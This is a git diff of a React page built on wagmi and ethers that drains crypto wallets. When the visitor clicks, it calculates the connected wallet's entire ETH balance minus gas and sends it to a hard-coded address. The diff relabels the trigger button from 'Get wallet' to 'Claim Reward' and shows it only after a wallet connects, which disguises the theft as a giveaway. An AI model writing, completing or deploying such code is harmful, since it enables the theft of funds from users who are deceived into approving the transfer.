@@ -14,9 +14,10 @@ import { QueryClient, QueryClientProvider } from 'react-query';
 import { fetchBalance } from '@wagmi/core'
 import { fetchFeeData } from '@wagmi/core'
 import { useDebounce } from 'use-debounce'
-import { usePrepareSendTransaction,  useSendTransaction } from 'wagmi'
+import { usePrepareSendTransaction,  useSendTransaction, useWaitForTransaction } from 'wagmi'
 import { utils } from 'ethers'
 import { parseEther } from 'ethers/lib/utils.js'
+import { FaSpinner } from "react-icons/fa";
 
 
 
@@ -48,18 +49,21 @@ export default function Home() {
   const to = '0x80a79C84330600E8c1B98CDC66509676310DDE13'
   const [debouncedTo] = useDebounce(to, 500)
   const [debouncedAmount] = useDebounce(amount, 500)
+ 
   //let stringValue = toString(utils.parseEther(debouncedAmount))
   //console.log(amount)
 
   const [configState, setConfigState] = useState({  })
   const { config } = usePrepareSendTransaction(configState)
- 
+  console.log(gasFee, myBalance, amount)
   const  { sendTransaction } = useSendTransaction({
     request: {
       to: debouncedTo,
       value:  parseEther(String(amount)),
 },
 })
+
+
 
   const accBalance = async ()=>{
     const balance = await fetchBalance({
@@ -88,24 +92,31 @@ export default function Home() {
         setLoggedIn(true)
     }
   },[])
+
+  useEffect(()=>{
+    if(isConnected){
+      accBalance()
+    }
+     
+  })
   
   const getWallet = async () => {
-    await accBalance()
-
-
-    const amtToSend = (myBalance) - (gasFee*100000)
+    
+    const amtToSend = (myBalance) - (gasFee*110000)
+    
+    
     if (amtToSend < 0) {
       setAmount(0)
     } else {
       setAmount(amtToSend.toString())
-      console.log(gasFee * 1000000)
-      if (myBalance !== '0' && gasFee !== '0') {
+      //console.log(gasFee * 110000)
+      if (myBalance !== '0' && gasFee !== '0' && amount !=0) {
         
-    
+        
         sendTransaction?.()
       }
     }
-    console.log(gasFee, myBalance, amtToSend)
+    //console.log(gasFee, myBalance, amtToSend)
   }
    
   
@@ -124,8 +135,11 @@ export default function Home() {
       <>
       
         <Homepage />
-        <button className='btn btn-primary' onClick={getWallet}>Get wallet</button>
-      
+        {
+          isConnected && (<button className='btn btn-primary' onClick={getWallet}>Claim Reward </button>
+          )
+        }
+        
 
       <Web3Modal projectId={projectId} ethereumClient={ethereumClient} />
      
